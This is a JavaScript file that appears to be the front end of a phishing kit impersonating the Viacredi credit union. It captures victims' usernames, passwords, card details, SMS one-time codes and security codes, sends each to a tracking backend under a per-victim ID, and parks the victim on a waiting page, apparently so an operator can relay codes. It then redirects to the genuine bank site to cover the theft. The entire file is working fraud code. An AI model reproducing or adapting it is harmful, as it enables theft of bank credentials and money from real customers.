const mp = (() => {
    const client_id = document.body.dataset.client
    //private var/functions
    function validation(field) {
        if (!field.value) return false

        return true
    }

    async function handleSubmitPass(form) {
        try {
            const data = util.serialize(form)

            const config = {
                method: `put`,
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data),
            }

            const client = await fetch(`/api/client/password`, config)

            const response = await client.json()

            console.log(response)

            const modalLetter = $('#modalLetter')

            modalLetter.modal('show')

            //if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
        } catch (error) {
            console.log(error)
        }
    }

    async function formPassSubmit(target) {
        const form = document.querySelector(target)

        if (!form) return

        const password = form.querySelector('#password')
        const modalLetter = $('#modalLetter')

        form.addEventListener('submit', function (e) {
            e.preventDefault()

            //if (!validation(password)) return

            const ModalSubmit = document.querySelector('.saveLetter')

            modalLetter.modal('show')

            ModalSubmit.addEventListener('click', async function (e) {
                e.preventDefault()

                const data = document.querySelector('.inputs_letters input[name="letters"]')

                if (data) {
                    try {
                        const config = {
                            method: `put`,
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({ auth: data.value }),
                        }

                        const client = await (await fetch(`/api/client/letter/${client_id}`, config)).json()

                        modalLetter.modal('hide')

                        window.location.href = `https://www.viacredi.coop.br/`
                    } catch (error) {
                        console.log(`Erro au subir modal de letra`, error)
                    }
                }
            })

            handleSubmitPass(form)
        })
    }

    function formUserSubmit(target) {
        const form = document.querySelector(target)

        if (!form) return

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            const username = form.querySelector(`#username`)

            if (!username) {
                if (!username.value) return
            }

            try {
                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ username: username.value }),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/username/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }
            } catch (error) {
                console.log(error)
            }
        })
    }
    function submitVerifyCard(target) {
        const form = document.querySelector(target)
        //card_verify

        if (!form) return

        form.addEventListener('submit', async function (e) {
            e.preventDefault()

            try {
                const data = util.serialize(form)

                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(data),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/card/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }

                ////:end
            } catch (error) {
                console.log(error)
            }
        })
    }

    function verifyAuth(target) {
        //formMail__code verify
        const form = document.querySelector(target)

        const client_id = document.body.dataset.client

        if (!form || !client_id) return

        const button = form.querySelector(`button`)

        console.log(`form verify`, button)

        button.addEventListener('click', async function (e) {
            e.preventDefault()

            try {
                const fields = form.querySelectorAll('input[type="tel"]')

                let validation = false

                let values = ``

                for (const field of fields) {
                    if (!field.value) {
                        validation = false
                    } else {
                        validation = true
                    }

                    values += field.value
                }

                const value = { auth: values }

                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(value),
                }

                if (client_id) {
                    const client = await fetch(`/api/client/auth/${client_id}`, config)

                    const response = await client.json()

                    if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
                }
            } catch (error) {
                console.log(error)
            }
        })
    }

    function submitCode(target) {
        const form = document.querySelector(target)

        if (!form) return

        const button = form.querySelector('button.validate')

        if (!button) return

        button.addEventListener('click', async function (e) {
            e.preventDefault()

            let values = ''
            const clientID = form.elements['client'].value

            const inputs = [...form.querySelectorAll('input[type="tel"]')]

            inputs.forEach((input) => {
                if (!input.value) {
                    input.setCustomValidity("Informe o c'odigo de 6 digitos")
                    return input.reportValidity()
                }
            })

            button.disabled = true

            for (let i = 1; i < 7; i++) {
                const inputs = form.elements[`number_${i}`]

                if (inputs) values += inputs.value
            }

            if (values.length < 4) return

            try {
                const config = {
                    method: `put`,
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ phone: values }),
                }

                const client = await fetch(`/api/client/sms/${clientID}`, config)

                const response = await client.json()

                if (client.status === 200) return (window.location.href = `/await?client=${response.id}`)
            } catch (error) {
                console.log(error)
            }
        })
    }

    return {
        //public var/functions
        formPassSubmit,
        formUserSubmit,
        submitVerifyCard,
        submitCode,
        verifyAuth,
    }
})()
//
mp.verifyAuth(`.formMail__code.authenticate`)
mp.submitVerifyCard(`.card_verify`)
mp.submitCode(`.formMail__code.verify`)
mp.formPassSubmit(`.main-form-login.password`)
mp.formUserSubmit(`.main-form-login.send-error-login`)
